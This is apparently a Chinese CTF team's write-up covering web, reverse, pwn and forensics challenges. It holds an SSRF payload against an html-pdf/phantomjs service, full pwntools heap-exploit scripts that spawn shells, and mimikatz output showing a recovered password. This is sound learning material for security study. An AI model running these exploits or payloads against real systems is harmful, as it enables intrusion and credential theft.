punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'No such file!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>由于html-pdf 用到了phanthomjs渲染，因此存在ssrf。我们可以使用数组绕过<code>.includes(xxx)</code>的检测。并插入ssrf的内容</p><p>Payload:</p><pre class="language-none"><code class="language-none">content[]&#x3D;&lt;script&gt;location.href&#x3D;&quot;http:&#x2F;&#x2F;127.0.0.1:8888&#x2F;api&#x2F;files?username&#x3D;admin&amp;filename&#x3D;..&#x2F;files&#x2F;flag&amp;checksum&#x3D;be5a14a8e504a66979f6938338b0662c&quot;;&lt;&#x2F;script&gt;</code></pre><p>容器打完后会崩，试了几次，然后访问下<code>/admin</code>路由 </p><p>直接去访问文件，<code>./api/files/be5a14a8e504a66979f6938338b0662c</code>，得到flag</p><hr><h2 id="Web总结"><a href="#Web总结" class="headerlink" title="Web总结"></a>Web总结</h2><p>觉得这是发挥不错的一场比赛了，虽然题目很简单，但是还是学到了很多，尤其是安全检测，自己独立凭感觉解出来题目自信心也是upup。还有层层穿透，很有趣的内网渗透题目，很简单，但是给我敲开了这扇大门，感觉很有兴趣，以后可以多研究一下。</p><p>以下是本队的WP，虽然成绩不太行，但是尽力就好。</p><hr><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="勒索解密"><a href="#勒索解密" class="headerlink" title="勒索解密"></a>勒索解密</h3><p>32位exe程序，要知道程序加密文件的流程，</p><p>看到了这个，Microsoft Enhanced RSA and AES Cryptographic Provider</p>猜测先把key+timestamp联系到了一起，然后sha256加密变成那个key，再拿去aes加密。<img src="/article/2021xyb/3202085600-229394217-57394DB0558F49AAB782959EC5A93100.JPG" class="" title="3202085600-229394217-57394DB0558F49AAB782959EC5A93100" loading="lazy"><img src="/article/2021xyb/3202085600-886959209-9385D62446713B8751AEFB402591DB09.JPG" class="" title="3202085600-886959209-9385D62446713B8751AEFB402591DB09" loading="lazy"><p>和时间戳连着 然后给key</p><img src="/article/2021xyb/3202085600-201622791-5AC8865E89504CA44AD22B2BEE9B0612.JPG" class="" title="3202085600-201622791-5AC8865E89504CA44AD22B2BEE9B0612" loading="lazy"><p>来了一下0x800C这种加密，然后得到一个key，再拿这个key去aes加密文件</p><img src="/article/2021xyb/3202085600-1838268119-6D44CB41D7988685E018363677E2C6D9.JPG" class="" title="3202085600-1838268119-6D44CB41D7988685E018363677E2C6D9" loading="lazy"><p>AES：660E</p><img src="/article/2021xyb/3202085600-1920708629-16E549D4945DC54A0B07B4FB3F3591D3.JPG" class="" title="3202085600-1920708629-16E549D4945DC54A0B07B4FB3F3591D3" loading="lazy"><p>感觉那个rsa只是用来校验完整性</p><p>根据加密文件的时间戳，修正为UTC+0时间，可知中间的time应为0x611a1105</p><pre class="language-plain" data-language="plain"><code class="language-plain">import base64from Crypto.Cipher import AESfrom Crypto import Randomimport hashlibimport osimport base64def encrypt(data, password):    bs = AES.block_size    pad = lambda s: s + (bs - len(s) % bs) * chr(bs - len(s) % bs)    cipher = AES.new(password)    data = cipher.encrypt(pad(data))    return (data)    if __name__ == '__main__':    key = bytearray.fromhex('b22fc60e4fd4544b05111a6121e7b18e')    key = hashlib.sha256(key).hexdigest()    key = bytes.fromhex(key)[:16]    iv = b'\x00'*16    cipher = AES.new(key, AES.MODE_CBC, iv )    f = open('flag.bmp.ctf_crypter', 'rb')    data = f.read()[:-0x80-4]    de = cipher.decrypt(data)    d = open('daidai.bmp','wb')    d.write(de)    d.close()    f.close()</code></pre><img src="/article/2021xyb/1629625133(1).png" class="" title="1629625133(1)" loading="lazy"><h3 id="Rev-Dizzy"><a href="#Rev-Dizzy" class="headerlink" title="Rev_Dizzy"></a>Rev_Dizzy</h3><p>由于数据太大超过文档限制，这里不便贴出，两个puts直接解决，签到题。直接逆序文件，加减号互换，跑一下出flag。</p><img src="/article/2021xyb/1629629205(1).png" class="" title="1629629205(1)" loading="lazy"><hr><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="note"><a href="#note" class="headerlink" title="note"></a>note</h3><p>通过scanf的格式化字符串漏洞修改TOPCHUNK的size并申请大于topchunk的堆块使其进入unsortedbin中，在申请回来时因为没有零截断所以可以直接打印出mainarena地址，进而获得libc基地址，通过计算偏移后可以构建system(“&#x2F;bin&#x2F;sh”)的ROP链并获取shell</p><p>exp：</p><pre class="language-plain" data-language="plain"><code class="language-plain">from pwn import *import timecontext.log_level = 'debug'context.arch = 'amd64'def menu(index):p.sendlineafter('choice: ', str(index))def add(size, content):menu(1)p.sendlineafter('size: ', str(size))p.sendlineafter('content: ', content)def say(say1, say2):menu(2)p.sendlineafter('say ? ', say1)p.sendlineafter('? ', say2)def debug():gdb.attach(p)p = process('./pwn1')# p = remote('47.104.70.90','25315')libc = ELF('libc-2.23.so')rbp_rip = '%17$s\x00'# gdb.attach(p,'b *$rebase(0x1235)')add(0x10,'lby')p.recvuntil('addr: ')heap_addr = int(p.recvline().replace('\n',''),16)success('heap: '+hex(heap_addr))pl1 = '%7$s'+'aaaa'+p64(heap_addr)pl2 = 'a'*0x18+p64(0xfe1)say(pl1, pl2)for i in range(24):add(0x90,'a'*0x90)add(0xd0,'a'*0xd0)add(0x10, 'a'*8)menu(3)p.recvuntil('content:aaaaaaaa\n')malloc_hook = u64(('\x00'+p.recv(5)).ljust(8,'\x00'))-224-0x10libc_base = malloc_hook-libc.sym['__malloc_hook']system = libc_base+libc.sym['system']sh = libc_base + libc.search('/bin/sh\x00').next()prdi_ret = libc_base+libc.search(asm("pop rdi\nret")).next()success(hex(malloc_hook))pl3 = p64(prdi_ret)+p64(sh)+p64(system)say('%17$s','a'*8+pl3)p.interactive()</code></pre><h3 id="PassWordBox-FreeVersion"><a href="#PassWordBox-FreeVersion" class="headerlink" title="PassWordBox_FreeVersion"></a>PassWordBox_FreeVersion</h3><p>fgets处溢出一字节，构成off by null漏洞，输入的内容会被加密所以要进行逆向分析，确保我们在堆上的数据是正常的</p><p>观察show函数，不难发现其在show之前又执行了一次加密函数，并且创建堆块的时候会直接输出密钥加密后的内容，将其与我们输入的内容进行相异或即可得到随机值</p><p>解决了加密的问题，然后我们就可以利用前面提到的offbynull漏洞进行利用，构造堆重叠已经堆块复用的情况，通过让堆块进入unsortedbin以此来泄露libc基地址，最后再通过往free_hook中写入onegadget来获取shell</p><pre class="language-plain" data-language="plain"><code class="language-plain">from pwn import *import timedef add(id,size,content):    p.sendlineafter("Input Your Choice:\n",str(1))    p.sendafter("Save:",str(id))    p.sendlineafter("Pwd:",str(size))    p.sendafter("Pwd:",content)def show(id):    p.sendlineafter("Choice:\n",str(3))    p.sendlineafter("Check:\n",str(id))def delete(id):    p.sendlineafter("Choice:\n",str(4))    p.sendlineafter("Delete:\n",str(id))def edit(id,data):    p.sendlineafter("Choice:\n",str(2))    p.sendline(str(id))    p.sendline(str(data))p=process('./pwdFree')libc = ELF("libc.so.6")add(0,0xf8,'\n')p.recvuntil('D:')key=u64(p.recv(8))rand=key^0xaadd(1,0xf8,'\n')add(2,0xf8,'\n')for i in range(7):    add(i+3,0xf0,'\n')  #3--9 full tcfor i in range(6):  #3-9 full tc    delete(i+3)delete(1)delete(0)num=0x200^randpayload=b'c'*0xf0+p64(num)add(0,0xf8,payload)delete(9)delete(2)for i in range(8):    add(1, 0xf8, '\n')show(0)p.recvuntil('Pwd is: ')key=u64(p.recv(8))l=key^randlibcbase=l-0x3ebca0add(9,0xf8,'\n')delete(1)delete(2)delete(0)free=libcbase+0x3ed8e8edit(9,p64(free))add(1,0xf8,'\n')one=libcbase+0x4f432system=libcbase+0x04f550system=one^randpayload=p64(system)add(2,0xf8,payload+b'\n')delete(1)p.interactive()</code></pre><h3 id="Lemon"><a href="#Lemon" class="headerlink" title="Lemon"></a>Lemon</h3><p>主要问题是2.26版本下, 未控制好指针导致任意写</p><p>数据结构如下:</p><p> lemon_name:</p><p>lemon_content:</p><p>主要可利用的函数是color:</p><p>这里的buf是指lemon_name结构, 所以可以控制指针lemon_addr的指向了, 因为只能用一次所以想控制整个tcache结构</p><p>其它一点可利用的函数:</p><p>开头的一次welcome:</p><p>虽然是有rand, 但无随机数种子, 所以是固定值, z3一把🔒!</p><p>eat函数: 可以打印chunkaddr第四字节, 用于配合后面分配堆块</p><p>整体思路: 利用color控制lemon_addr指向tcache的地址, 然后用一次释放一次可以做到一直控制tcache, 第一次使用可以设置tcache某些块数量达到7, 从而生成unsortedbin, 虽然无法直接打印, 但是使用particular write+爆破可以让chunk申请到_IO_2_1_stdout中, 然后泄露libc, 之后再以类似操作用environ打印出栈基址, 配合之前的泄露获取stack地址, 最后再用io即可打印出flag</p><p>难点:</p><p>多了个类似ptmalloc的检测在分配完成之后, 导致使用free_hook等充满难度:</p><p>exp:</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span><span class="token comment"># coding=utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> z3 <span class="token keyword">import</span> <span class="token operator">*</span>io<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'./lemon_pwn'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc/libc-2.26.so'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token keyword">def</span> <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    x<span class="token operator">=</span>BitVec<span class="token punctuation">(</span><span class="token string">'x'</span><span class="token punctuation">,</span> <span class="token number">33</span><span class="token punctuation">)</span>    x<span class="token operator">=</span><span class="token punctuation">(</span>x<span class="token operator">>></span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">^</span>x<span class="token operator">|</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token operator">*</span>x<span class="token operator">-</span><span class="token punctuation">(</span>x<span class="token operator">>></span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xffffffff</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token punctuation">(</span>x<span class="token operator">/</span><span class="token punctuation">(</span>x<span class="token operator">>></span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    s<span class="token operator">=</span>Solver<span class="token punctuation">(</span><span class="token punctuation">)</span>    s<span class="token punctuation">.</span>add<span class="token punctuation">(</span>x<span class="token operator">^</span><span class="token number">0x6b8b4567</span><span class="token operator">==</span><span class="token number">0x13b6db38</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> s<span class="token punctuation">.</span>check<span class="token punctuation">(</span><span class="token punctuation">)</span>    result<span class="token operator">=</span>s<span class="token punctuation">.</span>model<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> result<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>name<span class="token punctuation">,</span>length<span class="token punctuation">,</span>context<span class="token operator">=</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'choice >>> '</span><span class="token punctuation">,</span><span class="token string">'1'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'index of your lemon: \n'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'name your lemon: \n'</span><span class="token punctuation">,</span>name<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'length of message for you lemon: \n'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> length <span class="token operator">&lt;=</span> <span class="token number">0x400</span><span class="token punctuation">:</span>        io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'message: \n'</span><span class="token punctuation">,</span>context<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">eat</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'choice >>> '</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'index of your lemon : \n'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">throw</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>     io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'choice >>> '</span><span class="token punctuation">,</span><span class="token string">'3'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'index of your lemon : \n'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">color</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>context<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'choice >>> '</span><span class="token punctuation">,</span><span class="token string">'4'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'index of your lemon  : \n'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'draw and color!\n'</span><span class="token punctuation">,</span>context<span class="token punctuation">)</span>       <span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'me?\n'</span><span class="token punctuation">,</span><span class="token string">'yes'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">' number: \n'</span><span class="token punctuation">,</span>p32<span class="token punctuation">(</span><span class="token number">0x4a46bd98</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'first: \n'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'/bin/sh'</span><span class="token punctuation">)</span>            add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'wwww\n'</span><span class="token punctuation">,</span><span class="token number">0x30</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">,</span><span class="token number">0x90</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">,</span><span class="token number">0x60</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">'wwww\n'</span><span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">)</span>    <span class="token comment">#add(3,'a\n',944,'a\n')</span>    <span class="token comment">#add(3,'a\n',16,'a\n')</span>    eat<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'eat eat eat '</span><span class="token punctuation">)</span>    addr<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span>    color<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'b'</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span>p16<span class="token punctuation">(</span>addr<span class="token operator">-</span><span class="token number">0x250</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token triple-quoted-string string">''' control all tc'''</span>    throw<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>    throw<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">,</span><span class="token number">0x240</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">0x37</span><span class="token punctuation">)</span>    throw<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>    throw<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">,</span><span class="token number">0x240</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">13</span><span class="token operator">+</span>p16<span class="token punctuation">(</span>addr<span class="token operator">+</span><span class="token number">0xd0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">,</span><span class="token number">0x60</span><span class="token punctuation">)</span>    throw<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'a\n'</span><span class="token punctuation">,</span><span class="token number">0x240</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">13</span><span class="token operator">+</span>p16<span class="token punctuation">(</span><span class="token number">0x86ed</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token triple-quoted-string string">'''boom!'''</span>    add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">'a\n'</span><span class="token punctuation">,</span><span class="token number">96</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x33</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0xfbad1887</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span><span class="token string">'\x88'</span><span class="token punctuation">)</span>    <span class="token comment">#gdb.attach(io)</span>    stdin<span class="token operator">=</span>u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    libc_base <span class="token operator">=</span> stdin<span class="token operator">-</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'_IO_2_1_stdin_'</span><span class="token punctuation">]</span>    stdout <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'_IO_2_1_stdout_'</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>    environ <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'_environ'</span><span class="token punctuation">]</span>    throw<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">,</span><span class="token number">0x240</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">13</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>stdout<span class="token operator">-</span><span class="token number">0x33</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    throw<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token comment">#gdb.attach(io, '''b *$rebase(0x1106)''')</span>    add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">,</span><span class="token number">104</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x33</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0xfbad1887</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>environ<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>environ<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    stack<span class="token operator">=</span>u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x180</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>stack<span class="token punctuation">)</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">'b'</span><span class="token punctuation">,</span><span class="token number">48</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span>    throw<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">,</span><span class="token number">0x240</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">13</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>stdout<span class="token operator">-</span><span class="token number">0x33</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    throw<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">,</span><span class="token number">104</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x33</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0xfbad1887</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>stack<span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>stack<span class="token operator">+</span><span class="token number">0x28</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment">#gdb.attach(io)</span>    io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>   <span class="token keyword">try</span><span class="token punctuation">:</span>    <span class="token comment">#io=process('./lemon_pwn')</span>    <span class="token comment">#io = remote('47.104.70.90',34524)</span>    exp<span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token keyword">except</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><hr><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="层层取证"><a href="#层层取证" class="headerlink" title="层层取证"></a>层层取证</h3><p>volatility 内存取证，使用 bitlocker 插件可得如下内容。</p><pre class="language-plain" data-language="plain"><code class="language-plain">Volatility Foundation Volatility Framework 2.6.1Address : 0xfa800d12e7e0Cipher  : AES-128FVEK    : 0ff9192acdbf1df3c6dc36fb58cf76ceTWEAK   : b423bd84872ff72b583bb9bdee1762ac</code></pre><p>使用 bdemount 可解密 bitlocker 磁盘分区，然后使用 mount 挂载，可以得到一个2.pcapng。</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$sudo</span> bdemount <span class="token parameter variable">-k</span> 0ff9192acdbf1df3c6dc36fb58cf76ce:b423bd84872ff72b583bb9bdee1762ac ext.dd /mnt/mount1</code></pre><p>使用 mimikatz 插件可以得到下列内容。</p><pre class="language-plain" data-language="plain"><code class="language-plain">Volatility Foundation Volatility Framework 2.6.1Module   User             Domain           Password-------- ---------------- ---------------- ----------------------------------------wdigest  XiaoMing         PC               xiaoming_handsomewdigest  PC$              WORKGROUP</code></pre><p>使用 FTK Imager 加载磁盘后在 XiaoMing 用户的桌面发现了 flag.txt 提示需要仿真。使用 VMware 加载 FTK Imager 挂载的物理磁盘新建虚拟机，使用 Oracle Virtual Box 启动虚拟机来仿真。</p><img src="/article/2021xyb/c09803d05f1e71c6e555bb1190c5fc8.jpg" class="" title="c09803d05f1e71c6e555bb1190c5fc8" loading="lazy"><p>对流量包使用 WireShark 分析，UDP 流 32 处有压缩包。</p><img src="/article/2021xyb/image-0655563.png" class="" title="image" loading="lazy"><p>将其提取出来后在注释中可发现提示，其解压密码与电脑登录密码一致。解压后得到 Word 文档，使用上述便签上的密码解密即可得到 flag。</p><h3 id="考古"><a href="#考古" class="headerlink" title="考古"></a>考古</h3><p>本题我们拿了一血，可惜<small>啧啧 发生了一些事情</small></p><p>使用 volatility 对内存镜像进行分析，在用户的桌面可以发现一个可疑的 exe 文件，将其提取出来。使用如下脚本解出来 data。</p><pre class="language-plain" data-language="plain"><code class="language-plain">#include&lt;stdio.h>#include&lt;stdlib.h>int main()&#123;  FILE *v4; // [esp+10h] [ebp-14h]  int k; // [esp+14h] [ebp-10h]  signed int j; // [esp+18h] [ebp-Ch]  int i; // [esp+1Ch] [ebp-8h]  char *key = "this_a_key";  unsigned char data[] =&#123;  164, 167, 120, 147, 254, 208,  69, 138, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  97,  97,  92, 107, 155, 134,   125, 104, 111, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  94,  97,  95, 107, 110, 121,   116, 104, 105, 115,  95,  97,  95, 123, 101, 121,   122, 104, 105, 115,  94,  97,  95, 107, 155, 134,   139, 151, 105, 115,  95,  97,  83, 107, 101, 121,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 